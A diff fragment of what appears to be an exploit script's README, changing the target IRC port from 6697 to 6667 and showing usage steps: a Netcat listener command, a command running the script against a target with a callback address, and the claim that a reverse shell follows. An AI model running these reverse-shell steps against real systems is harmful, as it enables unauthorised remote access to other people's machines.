@@ -24,9 +24,9 @@ Setup a Netcat listener on your local machine:
 nc -nlvp 4444
 ```
 
-Run the script against a target machine at `192.168.0.0` TCP port `6697`:
+Run the script against a target machine at `192.168.0.0` TCP port `6667`:
 ```
-python3 script.py 192.168.0.0 6697 192.168.1.0 4444
+python3 script.py 192.168.0.0 6667 192.168.1.0 4444
 ```
 
 Wait a minute and the Netcat listener should receive a reverse shell.
